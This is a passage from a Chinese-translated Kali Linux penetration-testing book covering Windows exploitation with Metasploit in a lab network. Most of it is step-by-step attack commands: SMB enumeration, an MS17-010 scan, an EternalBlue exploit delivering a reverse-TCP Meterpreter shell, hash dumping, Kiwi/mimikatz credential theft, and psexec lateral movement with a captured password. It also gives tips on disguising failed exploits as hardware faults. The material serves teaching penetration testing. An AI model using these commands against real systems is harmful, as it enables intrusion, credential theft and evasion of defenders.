我们以 rred 和 Randy Red 的身份登录，所以我们被要求进行 UAC 登录。我们得到了管理员权限，他们登录运行更新。如果用户已经有管理员权限，UAC 框仍然会出现，但你可以像平常一样点击 OK，一切都很好。这让你对 UAC 安全产生了疑问：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/a301b08c-26e3-4c2d-a8eb-154bbae9f5df.png)

文件正在运行，和大多数更新一样，安装更新后系统并没有真正做任何事情。用户回到工作中，认为一切都很好。让我们看看我们的 Kali 盒子上发生了什么。

嗯-看起来我们已经与具有管理员权限的 fflintstone 打开了一个会话。我们在 rred 的账户下，但我们有管理员权限 fflintstone。要与会话交互，请使用以下命令：

```
sessions -i 1 # Where 1 is the active session number.  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/d0a08e62-6d3f-400f-ad0e-c542bcafffb9.png)

这样做的结果，就像这里的消息所说的那样，是这样的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/833e721e-cf81-49eb-afc7-f5b5a226a539.png)

在我们运行的 EvilGrade 终端中，我们可以看到受害者机器与我们的恶意服务器的交互。在下面的截图中，你可以看到恶意网页被上传到受害者：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/ae8dd23e-d32a-47d0-be1a-3021ad98bf4c.png)

所以你知道了-更新可能并不像你想象的那么安全。始终从安全网络更新。再次，看一下可以使用这种方法轻松攻击的系统和应用程序的列表。

请注意，Windows 安全方法，如 UAC，对于阻止这种攻击没有起作用。对于系统来说，它看起来是在回家和妈妈交谈，而妈妈绝不会给你喂任何坏东西。

对于 Linux 系统，在 RedHat 系统上使用 apt-get 或 yum 时，这种攻击将失败。是的，你可以欺骗存储库站点，但当更新（实际上是我们的有效负载）被下载时，它将无法安装，因为所有存储库包都是用 GPG 密钥签名的。由于我们的虚假更新没有签名，我们的攻击失败了。对于使用 GPG 和公钥/私钥的方法有一些值得说的地方。

# 总结

在本章中，你已经学会了 NTLM 和 LLMR 协议的工作原理及其固有的弱点。你已经学会了如何毒害网络流量以捕获用户凭据。

你还学会了如何同时使用许多工具，如 Responder 和 Etthercap，来利用你的目标系统。最后，我们学会了如何欺骗更新服务，如 Windows Update，并利用这个服务来攻击系统。

# 进一步阅读

Responder 的 GitHub 可以在这里找到：[`github.com/SpiderLabs/Responder`](https://github.com/SpiderLabs/Responder)

Ettecap 项目页面可以在这里找到：[`www.ettercap-project.org/`](https://www.ettercap-project.org/)

有关 MS17-010（EternalBlue）漏洞的更多信息可以在以下链接找到：

+   [`cvedetails.com/cve/CVE-2017-0143/`](https://cvedetails.com/cve/CVE-2017-0143/)

+   [`cvedetails.com/cve/CVE-2017-0144/`](https://cvedetails.com/cve/CVE-2017-0144/)

+   [`cvedetails.com/cve/CVE-2017-0145/`](https://cvedetails.com/cve/CVE-2017-0145/)

+   [`cvedetails.com/cve/CVE-2017-0146/`](https://cvedetails.com/cve/CVE-2017-0146/)

+   [`cvedetails.com/cve/CVE-2017-0147/`](https://cvedetails.com/cve/CVE-2017-0147/)

+   [`cvedetails.com/cve/CVE-2017-0148/`](https://cvedetails.com/cve/CVE-2017-0148/)

+   [`technet.microsoft.com/en-us/library/security/MS17-010`](https://technet.microsoft.com/en-us/library/security/MS17-010)

+   [`zerosum0x0.blogspot.com/2017/04/doublepulsar-initial-smb-backdoor-ring.html`](https://zerosum0x0.blogspot.com/2017/04/doublepulsar-initial-smb-backdoor-ring.html)

+   [`github.com/countercept/doublepulsar-detection-script`](https://github.com/countercept/doublepulsar-detection-script)

+   [`technet.microsoft.com/en-us/library/security/ms17-010.aspx`](https://technet.microsoft.com/en-us/library/security/ms17-010.aspx)

作者在 SMB 欺骗和如何解决问题方面的更多信息可以在这里找到：[`www.boweaver.com/security/ntlm.php`](http://www.boweaver.com/security/ntlm.php)


# 第七章：获取访问权限

本章将演示使用 Kali Linux 工具（如社会工程工具包和 Metasploit）利用 Windows 漏洞的几种用例。您还将学习使用 Kali Linux 提供的利用数据库以及其他工具。您将学习使用工具来利用几种常见的 Windows 漏洞，并了解创建和实施新的利用以应对即将出现的 Windows 漏洞的准则。

我们将在本章中涵盖以下主题：

+   Pwnage

+   使用 Metasploit 利用 Windows 系统

+   使用高级足迹

# Pwnage

这里是有趣的开始。**Pwnage**！对于不了解的人来说。**Pwn**是黑客用语，意思是**拥有**。如果你被 pwned，你的系统已经被**拥有**。换句话说，我现在拥有你的系统，我完全控制它。利用是拥有或妥协机器的过程。到目前为止，我们已经通过收集目标的公共信息和扫描目标网络的漏洞来收集了有关我们目标的信息。我们现在准备进行攻击。

黑客会在最繁忙的时候攻击你的网络，并尽可能慢慢地、悄悄地进行。他们会试图保持在正常运营的噪音下。是的，在那个时候网络上有更多的眼睛，但是聪明的黑客知道，如果你慢慢地、安静地行动，大量的流量是一个很好的掩护。

如果你是安全运营人员，正在测试自己的网络，这不是一个好主意。最好在 CEO 睡觉的时候测试网络。如果在测试期间发生任何意外，可以在 CEO 醒来之前修复并使其正常工作。利用在测试期间通常不会使系统无法修复，但有些利用有时会挂起服务，或者完全挂起系统，需要重新启动。有些利用的整个目的是对服务或系统执行**拒绝服务**（**DoS**）。Bo 认为这些不是真正的利用。是的，你已经攻击了系统，并使其下线；但你没有渗透到机器里。你已经成功攻击了，但你没有控制它。真正的坏人不使用 DoS 攻击。他们想要进入，并从你的网络中窃取或复制数据。服务下线会引起 IT 的注意。如果你试图入侵，这不是一个好事。DoS 攻击是小白鼠的东西；如果这是你所知道的一切，不要自称为黑客。

DoS 工具也被认为是利用，因为它们以相同的方法作用于系统。DoS 会使系统挂起。用于获取访问权限的利用通常会使系统挂起足够长的时间，以便您注入某种代码来获取访问权限。基本上，你让机器变得愚蠢足够长的时间来建立连接。当你的利用工具失败时，它可能看起来像是一次 DoS 攻击。如果可以选择，最好让失败的利用看起来像是暂时的拒绝服务，这可能会被误解为源主机上的无辜 NIC 故障，而不是黑客在目标系统上测试利用代码。

**黑客提示**：

无论何时进行测试，始终要有人或某种方式在测试时重新启动服务或系统。在开始测试之前，始终要有人员的联系信息*当事情出错时*。尽管你可能试图保持安静，不让任何东西离线，但要有你的*计划 B*。此外，始终在测试之前准备好你的*脱离监狱*卡！

# 技术要求

+   使用 Metasploit 框架来利用 Windows 操作系统

+   高级足迹超越了简单的漏洞扫描。

+   使用枢纽来利用分段网络

# 使用 Metasploit 利用 Windows 系统

“不要害怕命令行..”

- Bo Weaver

Metasploit 框架是终极工具包。曾经有一段时间，构建一个渗透测试机器需要花费数天的时间。每个单独的利用工具都必须是以下内容：

+   追踪和研究

+   下载（有时通过拨号互联网连接）

+   从源代码编译

+   在您的破解平台上测试

现在，来自 Rapid7 的伟大人民带来了 Metasploit 框架。Metasploit 几乎为您提供了您在框架中需要的每个工具作为插件或功能。无论您在测试的网络上发现了什么操作系统甚至什么类型的设备，Metasploit 都可能有一个模块来利用它。Bo 的 90%工作都是用 Metasploit 完成的。

Metasploit 有两个版本——社区版本和专业版本。在命令行上，它们都是一样的。专业版的主要功能是一个漂亮的 Web 界面和报告工具，可以从该界面为您生成报告。您还可以获得一些用于测试大型网络的好工具，这些工具无法从命令行获得。一个功能是您可以从导入的漏洞扫描中选择一个或多个机器，专业版将自动选择模块并针对目标机器运行这些模块。如果您在大型网络上工作，或者进行大量测试，请获取专业版。它绝对物有所值，而且您可以轻松地在 Kali 攻击平台上使用它。

对于本书，我们将使用随 Kali Linux 提供的社区版本。

警告！如果您决定购买专业版，请不要卸载 Metasploit 的社区版本。这可能会破坏 Kali 的更新。安装专业版时，它将安装在自己的目录中。专业版将需要一些社区库才能运行。

在命令行使用 Metasploit 时，*Tab*键会为您自动完成很多操作。对于`show options`，输入`sh<tab> o<tab>`。您会看到这将自动完成命令。这在 Metsploit 中始终有效。

另外，要重复命令，向上箭头键将带您到先前的命令。这真的很有用。例如，当更改模块并攻击同一台机器时，`set RHOST 192.168.202.3`，向上箭头键到先前的命令可以节省时间。

好的，让我们启动 Metasploit。首先，我们需要在菜单栏中启动 Metasploit 服务。以下屏幕截图显示了 LXDE 桌面菜单。转到**Exploitation Tools** |** metasploit framework****:**

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/cdc352e4-49b1-4007-b143-aea5c72d8c69.png)

一个终端窗口将打开，服务将启动。下一个屏幕截图显示了启动时终端将向您显示的内容。Metasploit 使用 PostgreSQL 数据库服务器。在第一次运行服务时，可能需要几分钟才能启动。在下一个屏幕截图中，我们看到启动跳过初始化。Metasploit 已经在这台机器上设置好了。第一次设置后，您将看到这一点：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/84deaf5c-a145-498e-8321-de1bdaef7885.png)

**是的，黑客喜欢 Shell！**

一旦服务启动，输入`msfconsole`启动 Metasploit 控制台。当我们输入`workspace`时，我们可以看到工作区。我们将很快设置一个新的工作区。

**黑客提示**：

第一次启动 Metasploit 控制台时，它将创建数据库，所以让它花点时间。下一次使用它时，它将启动得更快。

要获取控制台命令列表，请随时输入`help`：

```
    msf > help

    Core Commands
    =============

    Command Description
    ------- -----------
    ? Help menu
    banner Display an awesome metasploit banner
    cd Change the current working directory
    color Toggle color
    connect Communicate with a host
    exit Exit the console
    get Gets the value of a context-specific variable
    getg Gets the value of a global variable
    grep Grep the output of another command
    help Help menu
    history Show command history
    irb Drop into irb scripting mode
    load Load a framework plugin
    quit Exit the console
    route Route traffic through a session
    save Saves the active datastores
    sessions Dump session listings and display information about sessions
    set Sets a context-specific variable to a value
    setg Sets a global variable to a value
    sleep Do nothing for the specified number of seconds
    spool Write console output into a file as well the screen
    threads View and manipulate background threads
    unload Unload a framework plugin
    unset Unsets one or more context-specific variables
    unsetg Unsets one or more global variables
    version Show the framework and console library version numbers

    Module Commands
    ===============

    Command Description
    ------- -----------
    advanced Displays advanced options for one or more modules
    back Move back from the current context
    edit Edit the current module or a file with the preferred editor
    info Displays information about one or more modules
    loadpath Searches for and loads modules from a path
    options Displays global options or for one or more modules
    popm Pops the latest module off the stack and makes it active
    previous Sets the previously loaded module as the current module
    pushm Pushes the active or list of modules onto the module stack
    reload_all Reloads all modules from all defined module paths
    search Searches module names and descriptions
    show Displays modules of a given type, or all modules
    use Selects a module by name

    Job Commands
    ============

    Command Description
    ------- -----------
    handler Start a payload handler as job
    jobs Displays and manages jobs
    kill Kill a job
    rename_job Rename a job

    Resource Script Commands
    ========================

    Command Description
    ------- -----------
    makerc Save commands entered since start to a file
    resource Run the commands stored in a file

    Database Backend Commands
    =========================

    Command Description
    ------- -----------
    db_connect Connect to an existing database
    db_disconnect Disconnect from the current database instance
    db_export Export a file containing the contents of the database
    db_import Import a scan result file (filetype will be auto-detected)
    db_nmap Executes nmap and records the output automatically
    db_rebuild_cache Rebuilds the database-stored module cache
    db_status Show the current database status
    hosts List all hosts in the database
    loot List all loot in the database
    notes List all notes in the database
    services List all services in the database
    vulns List all vulnerabilities in the database
    workspace Switch between database workspaces

    Credentials Backend Commands
    ============================

    Command Description
    ------- -----------
    creds List all credentials in the database

```

要获取单个命令的帮助，请输入`help <command>`，如下面的屏幕截图所示。我们有两个示例显示`use`和`hosts`命令的帮助。我们有一个列表显示其用法和与命令一起使用的任何标志的解释：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/b6263e6a-0bb2-42e4-b297-0f11c0467696.png)

首先，我们需要设置一个工作区。工作区在保持测试有序方面非常有帮助。工作区包含测试的所有收集数据，包括在利用期间收集的任何登录凭据和任何系统数据。最好将测试数据分开，以便稍后可以比较以前测试的结果。我们将设置一个名为`TestCompany-int-20180830`的项目。这是一种命名项目的方式，格式为`<client-name>-[ int（内部）| ext（外部）]-<start-date（unix-style）>`。这样可以帮助您在 6 个月后记住哪个测试是什么。

要创建新项目，请输入以下内容：

```
workspace -a TestCompany-int-20180830  
```

通过输入`workspace`，我们可以看到数据库中工作区的列表。运行命令时，您将在`TestCompany-int-20180830`工作区旁看到一个星号。这表明当您创建工作区时，您也进入了它。星号表示活动工作区。

要进入工作区，请输入以下内容：

```
workspace TestCompany-int-20180830   
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/b087d0b8-a037-4b4b-9a21-85eacf724f88.png)

我们可以使用`db_import`命令从扫描应用程序生成的 XML 文件中将数据从扫描中提取到工作区。所有扫描应用程序都将其数据导出到 XML，Metasploit 将自动从主要扫描应用程序导入数据：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/7395ccbb-6e48-4cf7-ae3f-79b7a5161ac8.png)

以下是将自动导入 Metasploit 的支持的扫描类型列表：

+   Acunetix

+   Amap 日志

+   Amap 日志 -m

+   Appscan

+   Burp 会话 XML

+   Burp 问题 XML

+   CI

+   Foundstone

+   FusionVM XML

+   IP 地址列表

+   IP360 ASPL

+   IP360 XML v3

+   Libpcap 数据包捕获

+   Masscan XML

+   Metasploit PWDump 导出

+   Metasploit XML

+   Metasploit Zip 导出

+   Microsoft 基线安全分析器

+   NeXpose 简单 XML

+   NeXpose XML 报告

+   Nessus NBE 报告

+   Nessus XML（v1）

+   Nessus XML（v2）

+   NetSparker XML

+   Nikto XML

+   Nmap XML

+   OpenVAS 报告

+   OpenVAS XML

+   Outpost24 XML

+   Qualys 资产 XML

+   Qualys 扫描 XML

+   Retina XML

+   Spiceworks CSV 导出

+   Wapiti XML

您还可以使用 Nmap 导入主机、服务和网络信息，并直接将 Nmap 的输出导入 Metasploit，使用 MSFconsole 的`db_nmap`命令。此命令适用于所有正常的`nmap`命令行标志。`db_`告诉 Metasploit 导入数据。只运行`nmap`将运行扫描，但不会直接将数据导入 Metasploit。您只会看到命令的输出。

要直接导入 Nmap 扫描，请运行以下命令：

```
db_nmap -A -sV -O 172.16.42.0/24  
```

`-A`告诉`nmap`运行所有测试。`-sV`告诉 Nmap 记录任何运行服务的版本。`-O`告诉 Nmap 记录任何运行主机的操作系统。我们将看到运行扫描的输出，但这些数据也被收集到数据库中。然后我们还可以通过运行`hosts`和`services`命令来查看导入后的结果。

以下代码显示了运行这些命令的结果：

```
hosts
services  
```

使用`hosts`命令，我们可以获得所有活动 IP 地址、任何收集的机器名称和机器的操作系统的列表。通过运行服务命令，我们可以获得网络上所有运行的服务及其相关的 IP 地址列表。您可以使用`-c`标志从命令更改表列表。有关此信息的帮助，请查看帮助。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/8675d5ad-0041-4adf-a65a-a44b80ec01b3.png)

# 使用高级足迹

漏洞扫描只提供了一些信息。实际攻击机器时，您需要进行一些深层探测，以检查有用的信息泄漏。从扫描中，我们可以看到一个 Windows 域控制器和一个运行 Windows 2008 服务器的 Windows 文件服务器。两者都在运行 SMB/NetBIOS 服务。这看起来是最可能的攻击路径。SMB/NetBIOS 服务存在已知的弱点。因此，让我们更仔细地查看这些服务。

在完全进行足迹识别之前，关于笔记的一点说明。特别是在进行手动探测时，请记住记录您的输出和发现。复制/粘贴是您最好的朋友。漏洞扫描总是生成漂亮的报告，其中所有数据都编译在一个地方。手动探测不会这样，所以这取决于您，您将收集许多以后会用到的数据。使用 KeepNote，我们在第一章中首先访问的内容，*选择您的发行版*。

以下是 Bo 进行测试的正常布局。KeepNote 最好的地方在于其框架非常开放，可以根据您的喜好进行设置和使用。此设置使用以下内容：

+   找到客户公司的文件夹

+   一般项目笔记页面

+   目标文件夹

+   每个正在测试的系统的单独页面。

KeepNote 甚至带有一个不错的 **导出为 HTML** 工具，您可以使用该工具导出您的笔记，其他人可以在没有 KeepNote 的情况下阅读它们。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/7e59aa05-5263-48b7-a2e3-441fb02a59a2.png)

1.  首先，让我们使用 `nbtscan` 快速查看我们需要的域名或工作组名称以及其他基本的 NetBIOS 数据。因此，让我们打开一个新的终端窗口并运行以下命令：

```
nbtscan -v -s : 192.168.202.0/24
```

`-v` 标志用于详细模式，并将打印出所有收集到的信息。`-s :` 标志将使用冒号制表格式分隔数据：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/550eb36b-0503-433e-9602-d681dc49a506.png)

我们可以看到域名是 `LAB1`，所有计算机都是该域的成员。我们以后会需要这些信息。

1.  回到 MSFconsole 窗口，运行以下命令：

```
msf> search smb  
```

我们得到了与 SMB 服务相关的所有模块的列表。这是扫描、探测、利用和后利用模块的列表。首先，我们将检查是否有共享目录，并检查访客帐户是否有任何权限。我们选择 `auxiliary/scanner/smb/smb_enumshares`。您可以通过按 *Ctrl* + *Shift* + *C* 选择文本并复制它，然后可以使用 *Ctrl* + *Shift* +*V* 粘贴：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/cfff891e-5022-47e6-ada3-3ee930c0b7de.png)

1.  要使用该模块，请运行以下命令：

```
use auxiliary/scanner/smb/smb_enumshares  
```

这将使您进入模块。我们使用此模块的方式是使用所有模块的正常方式。不同模块的配置可能会改变进入模块的操作，但配置是相同的。

1.  与使用 `use` 命令进入模块的方式相反，`use` 命令用于打开任何模块。要退出模块，请输入以下命令：

```
back  
```

这将带您回到 MSF 提示符。

1.  运行以下命令：

```
info auxiliary/scanner/smb/smb_enumshares  
```

使用此命令，我们可以查看有关模块的信息和帮助信息，而无需实际进入模块。

1.  进入模块后，输入以下命令：

```
show options  
```

这将显示模块的可用参数。使用此模块，我们需要设置要探测的域名和用户帐户的主机。通过使用空的 `SMBUser` 帐户运行此模块，您可以检查 `Everyone` 组是否具有任何权限。将其设置为 `Guest` 将检查访客帐户是否已启用，并将检查 `Everyone` 组。

请注意，我们有一个名为 `RHOSTS` 的参数。这是设置要探测的主机的参数。这是一个扫描器模块，因此参数是复数形式，可以接受网络范围或单个主机。

1.  通过输入以下命令设置配置：

```
set RHOSTS 192.168.202.3
set SMBDomain LAB1
set SMBUser Guest
show options  
```

`show options` 将再次显示配置，因此您可以在运行扫描之前检查它：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/edb766b0-e757-429f-8369-1bb96a0b3148.png)

# 解释扫描并根据结果进行构建

在以下截图中，我们可以通过输入以下命令查看扫描结果：

```
exploit  
```

我们可以看到扫描失败了，但给了我们宝贵的信息。首先，通过扫描失败，我们现在知道没有共享对 Everyone 组是开放的。通过响应，我们可以看出服务是活跃的，但拒绝连接。其次，我们可以看到，事实上，访客账户被禁用了。有人可能会说这没有任何进展，但从中我们已经确定了服务是活跃的，并接受来自我们 IP 地址的连接。这对我们下一步行动是重要信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/f0693af2-5e77-42c9-9453-1e8a13155802.png)

SMB 服务使用 RPC 管道传输信息，RPC 服务有时会泄露系统信息，所以让我们看看我们得到了什么。为了做到这一点，我们将使用 DCERPC Pipe Auditor 模块：

```
use auxiliary/scanner/smb/pipe_dcerpc_auditor
show options  
```

在以下代码中，我们看到了模块配置。我们可以使用箭头键向上箭头到之前模块的配置，并设置`SMBDomain`和`RHOSTS`设置：

```
set SMBDomain LAB1
set RHOSTS 192.168.202.3
show options
exploit  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/08b7b5a8-894b-4177-b3f9-00d41785fd22.png)

看起来我们的 SMB 服务被很好地锁定了。我们马上就会看到。

通过之前的扫描，我们可以看出这台机器已经有一段时间没有打补丁了。另外从我们的网络足迹，我们知道这是一个 Windows 2008 服务器，所以这排除了使用早于 2008 年的漏洞利用。我们还可以从我们的探针中得知服务器配置存在弱点。我们需要一个能绕过这些障碍的漏洞利用。

选择合适的漏洞利用是经验和反复尝试的问题。并非所有的漏洞利用都有效，有些可能需要多次尝试才能成功攻击系统。有些有时有效，然后在下一次尝试时失败。如果一开始没有成功，不要放弃。

在以下代码中，我们选择了`auxiliary/scanner/smb/smb_ms17_010`。这将检查系统是否容易受到 NSA 的方程式组织通过 Shadow Brokers 泄露的漏洞利用的攻击。这些漏洞利用包括 EnernalBlue、EternalRomance、EternalChampion 和 EternalSynergy。这些漏洞利用也是广为人知的勒索软件病毒 Wanacry 和 Petya 的基础，这些病毒曾在互联网上的许多网络中造成严重破坏。这些漏洞利用是攻击向量，用于获取访问权限、上传和运行有效载荷，加密受感染机器的驱动器。稍后，我们将使用这些漏洞利用来完成相同的任务，但是，我们不会破坏数据，而是窃取系统信息和用户凭据。所以，让我们扫描一下，看看我们的网络上是否有易受攻击的主机。要使用这个扫描工具，输入以下命令：

```
use auxiliary/scanner/smb/smb_ms17_010  
```

这将让你进入模块。要查看所需的选项，输入以下命令：

```
show options 
```

然后你会看到以下选项：

```
Module options (auxiliary/scanner/smb/smb_ms17_010):

Name Current Setting Required Description
---- --------------- -------- -----------
CHECK_ARCH true no Check for architecture on vulnerable hosts
CHECK_DOPU true no Check for DOUBLEPULSAR on vulnerable hosts
CHECK_PIPE false no Check for named pipe on vulnerable hosts
NAMED_PIPES /usr/share/metasploit-framework/data/wordlists/named_pipes.txt yes List of named pipes to check
RHOSTS yes The target address range or CIDR identifier
RPORT 445 yes The SMB service port (TCP)
SMBDomain . no The Windows domain to use for authentication
SMBPass no The password for the specified username
SMBUser no The username to authenticate as
THREADS 1 yes The number of concurrent threads  
```

我们需要设置一些选项来运行这个：

```
set RHOST 172.16.42.0/24 # This sets the target network
set SMBDomain LAB1 # We gained this information earlier.
set THREADS 5 # This will speed up the scan checking 5 hosts at a time.
```

然后设置以下内容：

```
exploit # To run the scan.  
```

当我们查看结果时，似乎我们有很多易受攻击的主机可供选择，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/fee135af-1e7d-4069-bc71-2aeaa6fc2fe9.png)

很多易于攻击的目标。让我们挑一些。通过运行`ms10_010`的搜索，我们将找到与此漏洞相关的漏洞利用：

```
search ms17_010  
```

你会看到以下的漏洞利用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/510f8e16-7530-4785-bc90-26b36b9262d7.png)

我们有来自同一框架的三个漏洞利用。`ms17_010_eternalblue`漏洞利用在 64 位系统上效果最好。实际上，如果你输入 show payloads，你会发现只有 x64 payloads 被显示出来。我曾经使用 x32 位 payloads，并成功在 32 位系统上运行，但这可能会导致 32 位系统挂起，导致蓝屏或重启。

`ms17_010_psexec`漏洞利用在 32 位系统上效果最好。`ms17_010_eternalblue_win8`漏洞利用在 Win8 和 Win10 系统上效果最好。这个漏洞利用还可以绕过这些系统上的 ASLR 保护。

我发现这些漏洞在域控制器上效果不佳。这很可能是因为域控制器期望 Active Directory 登录凭据，并且无法允许连接到 SMB 服务。最好选择另一台服务器，然后横向移动到域控制器。这将是我们的攻击策略。

从之前的扫描中，我们发现有一个易受攻击的 64 位系统，BO-SRV3。我们将使用`ms17_010_eternalblue`漏洞利用来妥协这个系统。使用以下代码加载模块：

```
use exploit/windows/smb/ms17_010_eternalblue
show options # to show the options  
```

对于选项，您需要加载以下内容：

```
set RHOST 172.16.42.7
set SMBDomain LAB1
```

要查看可用的有效载荷，请输入以下命令：

```
show payloads  
```

我们将使用以下内容：

```
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 172.16.42.140 # This will be kali's IP address
show options # To check your set up  
```

如果一切看起来正常，我们会得到以下结果：

```
exploit  
```

中了！我们赢了！我们看到漏洞利用成功运行，我们有了一个 Meterpreter shell：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/7ec94160-17b4-447a-bf2d-458b076d4a99.png)

运行以下命令，我们可以看到我们远程连接到了具有完整系统级访问权限的系统：

```
sysinfo # This shows the system's information
getuid # This will show the user access level
ipconfig # Shows the IP address of the compromised system.  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/69a8ce8a-4f7f-46ea-be85-52e5a68a1fbc.png)

是时候抢劫和掠夺了：

```
hashdump  
```

在下面的截图中，我们看到我们已经倒出了本地哈希：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/64ffa220-da8a-40eb-865a-73d3bee3b9bb.png)

所以我们有本地管理员的哈希。很可能这也是域控制器和其他主机上的本地管理员，但让我们也倒一些 Active Directory 信息。为了做到这一点，我们需要加载 Kiwi 工具包：

```
load kiwi
```

要查看命令，请随时输入`help`。以下是 Kiwi 命令列表：

```
Kiwi Commands
=============
Command Description
------- -----------
creds_all Retrieve all credentials (parsed)
creds_kerberos Retrieve Kerberos creds (parsed)
creds_msv Retrieve LM/NTLM creds (parsed)
creds_ssp Retrieve SSP creds
creds_tspkg Retrieve TsPkg creds (parsed)
creds_wdigest Retrieve WDigest creds (parsed)
dcsync Retrieve user account information via DCSync (unparsed)
dcsync_ntlm Retrieve user account NTLM hash, SID and RID via DCSync
golden_ticket_create Create a golden kerberos ticket
kerberos_ticket_list List all kerberos tickets (unparsed)
kerberos_ticket_purge Purge any in-use kerberos tickets
kerberos_ticket_use Use a kerberos ticket
kiwi_cmd Execute an arbitary mimikatz command (unparsed)
lsa_dump_sam Dump LSA SAM (unparsed)
lsa_dump_secrets Dump LSA secrets (unparsed)
password_change Change the password/hash of a user
wifi_list List wifi profiles/creds for the current user
wifi_list_shared List shared wifi profiles/creds (requires SYSTEM)  
```

使用`creds_all`命令将获得`msv`、`wdigest`、`tspkg`和`kerberos`凭据。基本上是对机器上所有保存或存储的凭据的转储。请注意，我们从最近登录到系统的域用户那里捕获了明文域凭据：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/c71f6cf4-9aa4-439a-8640-58270f1fcbbe.png)

所以一个已完成，有了攻击域控制器的凭据。

输入以下内容以退出 Meterpreter 会话而不关闭会话：

```
background
sessions # This will show you the session is still running.  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/23125dc2-375c-408f-9b62-af31c2645e21.png)

# 利用 32 位系统

在之前的部分中，我们使用标准的 EternalBlue 漏洞攻击了 64 位机器。现在让我们使用`psexec`模块来妥协 32 位系统。我们使用这个模块，因为我们从上次的利用中收集了凭据。这次我们要攻击网络上的一个工作站。工作站通常被很多不同的人使用，所以这台机器上应该有很多存储的凭据。我们拥有的凭据越多，我们的访问权限就越大。要使用这个模块，请输入以下内容：

```
use exploit/windows/smb/psexec
show options # To see the module's options.  
```

我们需要加载与之前相同的选项，但我们将攻击`172.16.42.173 \\WIN7-01`：

```
set RHOST 172.16.42.173 # Set the victim host.
set SMBDomain LAB1 # Set the domain.
set SMBUser fflintstone # The captured username
set SMBPass CatKeeper! # The captured clear text credentials (This can be a hash!)
show options # To check your settings.  
```

接下来，我们需要选择有效载荷，因此运行以下命令以查看可用的有效载荷：

```
show payloads  
```

在上一个利用中，当我们运行此命令时，我们只看到 64 位有效载荷。这次，我们看到可以选择 32 位和 64 位有效载荷。WIN7-01 是 32 位的，所以我们需要选择正确的有效载荷：

```
set PAYLOAD windows/meterpreter/reverse_tcp 
```

您会注意到这是相同类型的反向 TCP 有效载荷，但在其命令行中不显示 x64。这是 32 位系统的有效载荷。

如果您之前没有全局设置`LHOST`（您的 Kali 机器），现在需要设置它：

```
set LHOST 172.16.42.140 # This sets the local host. Use setg to set this value globally. 
```

**黑客提示**：

Metasploit 将自动尝试设置`LHOST`接口以进行利用。如果 Kali 机器连接到两个或更多网络，这可能会导致问题。利用处理程序可能连接到错误的网络，导致利用失败。通常，在运行 Metasploit 时，进入我的工作区后，我会全局设置`LHOST`接口，使用`setg`全局选项设置到本地主机。

再次运行`show options`命令，我们可以看到攻击远程主机的正确设置：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/d836e7c0-fc90-4767-ad06-dbfaa908be3f.png)

在下面的截图中，我们还看到我们在本地机器上的处理程序设置正确：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/8da4e7bb-4d62-4b63-9dcd-379db2859ae7.png)

接下来，运行以下命令：

```
exploit  
```

哎呀！我们又有一个主机被入侵，获得了完整的系统级访问权限。

运行以下命令：

```
sysinfo # This shows the system's information.
getuid # This shows the level of access to the system.
hashdump # To dump the local hashes and user accounts.
load kiwi # To load the Kiwi Toolset.  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/4ae60c63-82a8-4e97-9751-a0e91cdae4df.png)

再次加载 Kiwi 后，我们运行`creds_all`命令并在系统上转储所有保存或存储的凭据，包括系统和域凭据。

在这两个系统之间，我们现在有足够的凭据，我们知道现在可以毫无问题地接管域控制器。

# 使用 Xfreerdp 访问系统

**Xfreerdp**是 Kali 上用于使用 RDP 协议访问 Windows 系统的 RDP 客户端。当运行 Linux 时，Rdesktop 是默认的普通 RDP 客户端。 Xfreerdp 具有一些黑客喜欢的很酷的功能。使用 Rdesktop，您必须使用明文密码。使用 Xfreerdp，您可以运行*传递哈希*攻击，并在不必破解捕获的哈希的情况下访问 Windows 远程桌面会话。 Xfreerdp 是从命令行运行的，没有 GUI 界面。

您可以通过输入以下内容获取支持的选项的完整列表：

```
xfreerdp -help  
```

以下是帮助文件和支持的选项的副本：

```
